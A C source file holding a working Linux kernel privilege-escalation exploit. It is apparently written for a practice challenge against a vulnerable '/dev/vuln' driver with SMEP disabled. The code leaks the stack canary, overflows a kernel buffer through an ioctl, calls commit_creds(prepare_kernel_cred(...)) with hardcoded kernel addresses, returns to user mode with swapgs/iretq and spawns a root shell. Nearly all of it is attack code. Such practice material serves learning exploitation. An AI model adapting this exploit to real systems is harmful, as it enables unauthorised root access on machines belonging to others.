/* see my notes here for more info: https://www.notion.so/Process-and-task_struct-1348f5df87358075be32d9431aa31bd6*/

#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<fcntl.h>
#include<unistd.h>
#include<sys/ioctl.h>

#define IOCTL_VULN1_WRITE 4141
#define PREPARE_KERNEL_CRED 0xffffffff810b5ca0
#define COMMIT_CREDS 0xffffffff810b59f0
#define task_init 0xffffffff82a14a00

typedef int (* t_commit_creds) (void*); // t_commit_creds is a function pointer that takes a void* argument and return value of type int.
typedef void *(* t_prepare_kernel_cred) (void*);

t_commit_creds commit_creds = (t_commit_creds)COMMIT_CREDS;
t_prepare_kernel_cred prepare_kernel_cred = (t_prepare_kernel_cred)PREPARE_KERNEL_CRED;


/* variables to save register states */
unsigned long _cs;
unsigned long _ss;
unsigned long _rsp;
unsigned long _rflags;
unsigned long _rip;

unsigned long long canary;
int fd;

void get_shell() {
    if (getuid() == 0) {
        printf("[+] Exploit successful!\n");
        fflush(stdout);
        system("/bin/sh");
    }
    else {
        printf("[-] Exploit failed to get root...\n");
    }
}

void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov _cs, cs;"
        "mov _ss, ss;"
        "mov _rsp, rsp;"
        "pushf;" /* push all flags registers, which together only need an unsigned long to represent */
        "pop _rflags;"
        ".att_syntax;"
    );
    _rip = (unsigned long)&get_shell;
}

void restore_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "swapgs;" /* return the gs base to to user space TLS */
        "push _ss;" /* now we can reference user space */
        "push _rsp;"
        "push _rflags;"
        "push _cs;"
        "push _rip;"
        "iretq;"
        ".att_syntax;"
    );

}

void leak() {
    unsigned long long buf[10];
    /* Found that buf[4] is the canary */
    read(fd, buf, 10*sizeof(unsigned long long));
    for (int i = 0 ; i < 10; i++) {
        printf("buf[%d]: %llx\n", i, buf[i]);
    }
    canary = buf[4];
}

void exploit() {
    commit_creds(prepare_kernel_cred((void*)task_init));
    restore_state();
}

int main() {
    fd = open("/dev/vuln", 0);      // we only need ioctl
    if (fd < 0) {
        perror("open");
        return -1;
    }

    unsigned long long buffer[40];
    memset(buffer, 0x41, sizeof(buffer));

    leak();
    /* for this toy challenge, we disabled SMEP, so we can execute pages in user space*/
    int offset = 0x100 / 8;
    buffer[offset++] = canary;
    buffer[offset] = (unsigned long long)&exploit;
    save_state();

    if (ioctl(fd, IOCTL_VULN1_WRITE, &buffer) == -1) {
        perror("ioctl");
        return -1;
    } 
}

